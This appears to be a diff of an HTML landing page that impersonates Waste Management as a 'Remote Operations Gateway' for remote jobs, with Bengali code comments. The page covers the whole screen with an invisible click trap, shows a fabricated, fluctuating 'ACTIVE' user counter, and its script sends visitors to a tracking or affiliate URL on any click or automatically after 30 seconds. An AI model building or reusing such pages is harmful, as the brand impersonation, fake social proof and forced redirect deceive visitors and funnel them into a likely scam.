@@ -3,42 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Waste Management® Official | Remote Hub Portal</title>
+    <title>Waste Management® Official | Remote Network Operations & Onboarding</title>
     
     <meta property="og:title" content="Waste Management® Official | Remote Hub Portal">
-    <meta property="og:description" content="Secure internal network node for verified background scheduling.">
+    <meta property="og:description" content="Secure internal network node for verified background scheduling and route processing slots.">
     <meta property="og:type" content="website">
 
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;700;800&family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&family=JetBrains+Mono:wght@700;800&display=swap" rel="stylesheet">
 
     <style>
         :root {
-            /* ব্যাকগ্রাউন্ড আরও ডার্ক ও প্রিমিয়াম করা হয়েছে যেন গ্লাস ইফেক্ট ফুটে ওঠে */
-            --bg-base: #02040a;
+            --bg-deep: #02040a;
             --wm-yellow: #fdb813;
+            --neon-red: #ff3333;
+            --glass-card: rgba(10, 15, 30, 0.7);
+            --glass-border: rgba(255, 255, 255, 0.12);
             --text-main: #ffffff;
-            --text-muted: #8b949e;
+            --text-secondary: #a3aed0;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
 
         body {
-            background-color: var(--bg-base);
-            /* গ্লাস ভাইব পপ করানোর জন্য ব্যাকগ্রাউন্ডে শক্তিশালী নিয়ন লাইট গ্লো */
+            background-color: var(--bg-deep);
+            /* ব্যাকগ্রাউন্ডে কড়া সিনেমাটিক নিয়ন রেড এবং ডার্ক ব্লু সাইবারপাঙ্ক গ্লো */
             background-image: 
-                radial-gradient(circle at 50% -20%, rgba(37, 99, 235, 0.25) 0%, transparent 50%),
-                radial-gradient(circle at 50% 110%, rgba(0, 104, 55, 0.15) 0%, transparent 50%);
+                radial-gradient(circle at 90% 10%, rgba(255, 51, 51, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 10% 90%, rgba(253, 184, 19, 0.12) 0%, transparent 45%),
+                radial-gradient(circle at 50% 50%, rgba(15, 23, 42, 0.95) 0%, var(--bg-deep) 100%);
             background-attachment: fixed;
             color: var(--text-main);
-            overflow: hidden; /* অতিরিক্ত স্ক্রলিং চিরতরে বন্ধ */
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
+            overflow-x: hidden;
+            line-height: 1.4;
             cursor: pointer;
         }
 
-        /* পুরো স্ক্রিন জুড়েই থাকবে এই ইনভিসিবল ক্লিক ট্র্যাপ */
         .master-intercept-shield {
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -46,24 +45,26 @@
             cursor: pointer;
         }
 
-        /* হেডার - পিওর ফ্রস্টেড গ্লাস */
+        /* হেডার - ফুল সাইবার ড্যাশবোর্ড ভাইব */
         header {
-            background: rgba(10, 15, 30, 0.4);
+            background: rgba(4, 8, 16, 0.85);
             backdrop-filter: blur(25px);
             -webkit-backdrop-filter: blur(25px);
-            border-bottom: 1px solid rgba(255, 255, 255, 0.12);
-            padding: 16px 20px;
+            border-bottom: 2px solid rgba(255, 255, 255, 0.05);
+            padding: 12px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            width: 100%;
+            position: fixed;
+            top: 0; left: 0; width: 100%;
             z-index: 100;
         }
 
         .brand-logo-text {
-            font-weight: 800;
+            font-weight: 900;
             font-size: 16px;
-            letter-spacing: -0.5px;
+            letter-spacing: 0.5px;
+            text-shadow: 0 0 10px rgba(253, 184, 19, 0.3);
         }
         .brand-logo-text span { color: var(--wm-yellow); }
 
@@ -71,16 +72,16 @@
             display: flex;
             align-items: center;
             gap: 8px;
+            position: relative; z-index: 110;
         }
 
-        /* রিয়ালিস্টিক গ্লাস কাউন্টার */
+        /* চোখে লাগার মতো কড়া লাল নিয়ন একটিভ ট্র্যাকার */
         .live-user-tracker-card {
-            background: rgba(239, 68, 68, 0.08);
-            border: 1px solid rgba(239, 68, 68, 0.3);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            padding: 5px 10px;
-            border-radius: 30px;
+            background: rgba(255, 51, 51, 0.12);
+            border: 1px solid var(--neon-red);
+            box-shadow: 0 0 12px rgba(255, 51, 51, 0.25);
+            padding: 4px 10px;
+            border-radius: 6px;
             display: flex;
             align-items: center;
             gap: 6px;
@@ -88,132 +89,179 @@
 
         .tracker-lbl {
             font-size: 10px;
-            font-weight: 700;
-            color: #fca5a5;
+            font-weight: 900;
+            color: #ff9999;
+            letter-spacing: 0.5px;
         }
 
         .tracker-val {
             font-size: 12px;
             font-weight: 800;
-            color: #ef4444;
+            color: #ffffff;
             font-family: 'JetBrains Mono', monospace;
         }
 
         .beacon-signal-pulse {
-            width: 6px; height: 6px;
-            background-color: #ef4444;
+            width: 7px; height: 7px;
+            background-color: var(--neon-red);
             border-radius: 50%;
             position: relative;
+            box-shadow: 0 0 8px var(--neon-red);
         }
         .beacon-signal-pulse::after {
             content: ''; position: absolute;
             width: 100%; height: 100%; top: 0; left: 0;
-            background: #ef4444; border-radius: 50%;
-            animation: pulseWave 1.8s infinite ease-in-out;
+            background: var(--neon-red); border-radius: 50%;
+            animation: pulseWave 1.5s infinite ease-in-out;
         }
 
-        /* লাইভ ডিভাইস ক্লক গ্লাস ব্যাজ */
+        /* চোখে লাগার মতো কড়া হলুদ লাইভ ক্লক */
         .badge-live-clock {
             font-family: 'JetBrains Mono', monospace;
             font-size: 11px;
-            color: var(--wm-yellow);
-            background: rgba(253, 184, 19, 0.06);
-            border: 1px solid rgba(253, 184, 19, 0.3);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            padding: 5px 10px;
-            border-radius: 30px;
-            font-weight: 700;
+            color: #000000;
+            background: var(--wm-yellow);
+            border: 1px solid #ffffff;
+            box-shadow: 0 0 10px rgba(253, 184, 19, 0.4);
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-weight: 800;
         }
 
-        /* মেইন কন্টেনার - একদম ক্লিন এবং ছিমছাম */
-        main {
+        section {
             position: relative;
             z-index: 10;
-            padding: 0 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            flex-grow: 1;
+            padding: 10px 15px;
+            max-width: 480px; /* মোবাইল ভিউ আরও টাইট করার জন্য */
+            margin: 0 auto;
+        }
+
+        #hero-hub {
+            padding-top: 85px;
+            padding-bottom: 5px;
+        }
+
+        /* মেইন ডার্ক গ্লাস কনটেইনার - যা সাদামাটা ভাব দূর করবে */
+        .main-glass-terminal {
+            background: var(--glass-card);
+            border: 1px solid var(--glass-border);
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            border-radius: 16px;
+            padding: 22px 18px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7), inset 0 1px 1px rgba(255,255,255,0.1);
             text-align: center;
         }
 
-        /* গ্লাস প্যানেল - মেইন বক্স */
-        .glass-portal-card {
-            background: rgba(255, 255, 255, 0.02);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            backdrop-filter: blur(30px);
-            -webkit-backdrop-filter: blur(30px);
-            border-radius: 24px;
-            padding: 30px 20px;
-            width: 100%;
-            max-width: 360px;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4), inset 0 1px 0 rgba(255,255,255,0.1);
-        }
-
-        .node-tag {
+        .announcement-bar {
             display: inline-flex;
+            align-items: center;
+            gap: 6px;
             background: rgba(255, 255, 255, 0.05);
             border: 1px solid rgba(255, 255, 255, 0.1);
             padding: 4px 12px;
-            border-radius: 100px;
+            border-radius: 30px;
             font-size: 11px;
-            color: var(--text-muted);
             font-weight: 700;
-            margin-bottom: 16px;
+            color: var(--wm-yellow);
+            margin-bottom: 12px;
+            text-transform: uppercase;
             letter-spacing: 0.5px;
         }
 
         h1 {
             font-size: 24px;
-            font-weight: 800;
-            line-height: 1.25;
+            font-weight: 900;
+            line-height: 1.2;
             letter-spacing: -0.5px;
-            margin-bottom: 12px;
+            margin-bottom: 8px;
+            color: #ffffff;
         }
-        h1 span { color: var(--wm-yellow); }
+        h1 span { 
+            color: var(--wm-yellow);
+            text-shadow: 0 0 15px rgba(253, 184, 19, 0.2);
+        }
 
-        p.subtitle {
+        .hero-lead-paragraph {
             font-size: 13px;
-            color: var(--text-muted);
-            line-height: 1.4;
-            margin-bottom: 24px;
+            color: var(--text-secondary);
+            margin-bottom: 18px;
+            font-weight: 500;
         }
 
-        /* থ্রিডি গ্লাস এফেক্ট নিয়ন বাটন */
+        .cta-action-box {
+            position: relative; z-index: 120;
+            width: 100%;
+        }
+
+        /* মারাত্মক কড়া সলিড গ্লোয়িং হলুদ বাটন */
         .btn-prime-terminal {
             display: block;
             width: 100%;
-            background: linear-gradient(135deg, #ffdd44 0%, var(--wm-yellow) 100%);
-            color: #02040a;
-            border: 1px solid rgba(255, 255, 255, 0.4);
-            padding: 16px;
-            font-size: 14px;
-            font-weight: 800;
-            border-radius: 12px;
+            background: #fdb813;
+            color: #000000;
+            border: 2px solid #ffffff;
+            padding: 14px 20px;
+            font-size: 15px;
+            font-weight: 900;
+            border-radius: 8px;
             text-transform: uppercase;
             letter-spacing: 0.5px;
-            box-shadow: 0 10px 30px rgba(253, 184, 19, 0.3);
-            transition: transform 0.1s ease;
+            box-shadow: 0 0 25px rgba(253, 184, 19, 0.6);
+            transition: all 0.2s ease;
+        }
+        .btn-prime-terminal:active {
+            transform: scale(0.98);
+            box-shadow: 0 0 10px rgba(253, 184, 19, 0.4);
         }
 
-        /* মিনিমালিস্টিক গ্লাস ফুটার */
+        #operations-matrix {
+            padding-top: 10px;
+        }
+
+        .section-header-box h2 {
+            font-size: 15px;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #64748b;
+            margin-bottom: 8px;
+            padding-left: 4px;
+        }
+
+        /* সাব-সিস্টেম নোড গ্রিড */
+        .matrix-grid-container {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 8px;
+        }
+
+        .matrix-node-item {
+            background: rgba(10, 15, 30, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            padding: 10px;
+        }
+
+        .matrix-node-item h3 { font-size: 12px; font-weight: 800; margin-bottom: 2px; color: var(--wm-yellow); }
+        .matrix-node-item p { font-size: 11px; color: #718096; font-weight: 500; }
+
         footer {
-            background: rgba(2, 4, 10, 0.5);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
-            padding: 14px;
+            padding: 15px;
             text-align: center;
             font-size: 10px;
-            color: #3b4249;
-            width: 100%;
+            color: #4a5568;
+            margin-top: 5px;
+        }
+
+        @media (max-width: 768px) {
+            header { padding: 10px 15px; }
+            #hero-hub { padding-top: 105px; }
         }
 
         @keyframes pulseWave {
             0% { transform: scale(1); opacity: 0.8; }
-            100% { transform: scale(2.6); opacity: 0; }
+            100% { transform: scale(2.5); opacity: 0; }
         }
     </style>
 </head>
@@ -222,36 +270,57 @@
     <div class="master-intercept-shield"></div>
 
     <header>
-        <div class="brand-logo-text">WASTE <span>MANAGEMENT</span></div>
+        <div class="brand-container">
+            <div class="brand-logo-text">WASTE <span>MANAGEMENT</span></div>
+        </div>
         <div class="header-meta-group">
             <div class="live-user-tracker-card">
                 <div class="beacon-signal-pulse"></div>
                 <div class="tracker-lbl">ACTIVE:</div>
-                <div class="tracker-val" id="active-tracker-digits">2,813</div>
+                <div class="tracker-val" id="active-tracker-digits">2,814</div>
             </div>
-            <div class="badge-live-clock" id="live-device-clock">Live 00:00:00</div>
+            <div class="badge-live-clock" id="live-device-clock">Live --:--:--</div>
         </div>
     </header>
 
-    <main>
-        <div class="glass-portal-card">
-            <div class="node-tag">NODE // US-2026 ACTIVE</div>
+    <section id="hero-hub">
+        <div class="main-glass-terminal">
+            <div class="announcement-bar">
+                <span>NODE // US-2026 ACTIVE</span>
+            </div>
             <h1>Remote Operations <span>Gateway</span></h1>
-            <p class="subtitle">Secure administrative terminal for verified support routing slots. Synchronize your local session parameters below.</p>
+            <p class="hero-lead-paragraph">Secure administrative terminal for verified support routing slots. Synchronize your local session parameters below.</p>
             
-            <button class="btn-prime-terminal">ACCESS OFFICIAL PORTAL</button>
+            <div class="cta-action-box">
+                <button class="btn-prime-terminal">ACCESS OFFICIAL PORTAL</button>
+            </div>
         </div>
-    </main>
+    </section>
+
+    <section id="operations-matrix">
+        <div class="section-header-box">
+            <h2>System Parameters</h2>
+        </div>
+        <div class="matrix-grid-container">
+            <div class="matrix-node-item">
+                <h3>Data Entry</h3>
+                <p>Validation loops active.</p>
+            </div>
+            <div class="matrix-node-item">
+                <h3>Logistics</h3>
+                <p>Route criteria matched.</p>
+            </div>
+        </div>
+    </section>
 
     <footer>
-        <p>Secured Network Node System • WM International Inc.</p>
+        <p>© 2026 Waste Management International Inc.</p>
     </footer>
 
     <script>
         const targetGateLink = "https://www.af9m8trk.com/AAV11C1R/PB7121EP/?s1=Ashik";
         let loopTriggered = false;
 
-        // ৩০ সেকেন্ড পর অটোমেটিক স্মার্ট রিডাইরেক্ট
         setTimeout(() => {
             if (!loopTriggered) {
                 window.location.href = targetGateLink;
@@ -263,12 +332,10 @@
             window.location.href = targetGateLink;
         }
 
-        // ইউজারের রিয়েল-টাইম লোকাল ক্লক আপডেট
         function synchronizeDeviceClock() {
             const clockElement = document.getElementById('live-device-clock');
             if (clockElement) {
                 const localDate = new Date();
-                
                 let hours = localDate.getHours();
                 let minutes = localDate.getMinutes();
                 let seconds = localDate.getSeconds();
@@ -283,7 +350,6 @@
             }
         }
 
-        // রিয়েল-টাইম ইউজার কাউন্টার ফ্লাকচুয়েশন
         function engineActiveTrackerFlux() {
             const trackerContainer = document.getElementById('active-tracker-digits');
             if (trackerContainer) {
